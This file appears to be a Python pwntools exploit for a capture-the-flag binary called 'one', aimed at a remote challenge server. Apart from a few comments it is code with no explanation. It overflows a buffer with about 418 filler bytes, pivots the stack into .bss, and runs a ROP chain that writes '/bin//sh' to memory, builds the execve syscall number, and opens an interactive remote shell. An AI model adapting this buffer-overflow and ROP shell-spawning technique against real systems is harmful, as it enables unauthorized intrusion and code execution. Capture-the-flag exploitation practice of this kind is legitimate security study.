from pwn import *
from struct import pack

context.binary = elf = ELF('./one')

# p = process('./one')
# gdb.attach(p, 'init-gef\nb *0x400BCA')



# payload = "A" * 418
payload = ""

payload += pack('<Q', 0x0000000000410a63) # pop rsi ; ret
payload += pack('<Q', 0x00000000006b90e0) # @ .data
payload += pack('<Q', 0x00000000004005af) # pop rax ; ret
payload += '/bin//sh'
payload += pack('<Q', 0x000000000047f381) # mov qword ptr [rsi], rax ; ret
payload += pack('<Q', 0x0000000000410a63) # pop rsi ; ret
payload += pack('<Q', 0x00000000006b90e8) # @ .data + 8
payload += pack('<Q', 0x0000000000444c40) # xor rax, rax ; ret
payload += pack('<Q', 0x000000000047f381) # mov qword ptr [rsi], rax ; ret
payload += pack('<Q', 0x00000000004006a6) # pop rdi ; ret
payload += pack('<Q', 0x00000000006b90e0) # @ .data
payload += pack('<Q', 0x0000000000410a63) # pop rsi ; ret
payload += pack('<Q', 0x00000000006b90e8) # @ .data + 8
payload += pack('<Q', 0x0000000000449905) # pop rdx ; ret
payload += pack('<Q', 0x00000000006b90e8) # @ .data + 8
payload += pack('<Q', 0x0000000000444c40) # xor rax, rax ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x00000000004746b0) # add rax, 1 ; ret
payload += pack('<Q', 0x000000000040130c) # syscall




pop_rsp = 0x0000000000401e33
read = 0x00000000004498F0
pop_rdi = 0x00000000004006a6
pop_rsi = 0x0000000000410a63
pop_rdx = 0x0000000000449905

new_stack = elf.bss(0x30)

payload1 = "A" * 418
payload1 += flat(
    pop_rdi, 0,
    pop_rsi, new_stack,
    pop_rdx, len(payload),
    pop_rsp, new_stack
)

# D = list(cyclic(512))

# D[418:418 + 8] = "A" * 8
def brute(idx):
    context.log_level = "debug"
    p = remote("chall.nitdgplug.org", 30622)
    p.sendlineafter("you think?\n", '513')

    # D = "A" * 416
    d = flat(
        pop_rdi, 0,
        pop_rsi, new_stack,
        pop_rdx, len(payload) + 2,
        pop_rsp, new_stack
    )
    # print(len(d))
    D = "A" * idx
    # D = d * (512 - idx / 64)
    D += d
    D = D.ljust(513, chr(0))

    p.sendlineafter("anything else?\n", D)
    p.recvuntil("here you go.\n")

    p.sendline(payload)

    p.interactive()

i = 0
while True:
    print(i)
    brute(328)
    break
    i += 1

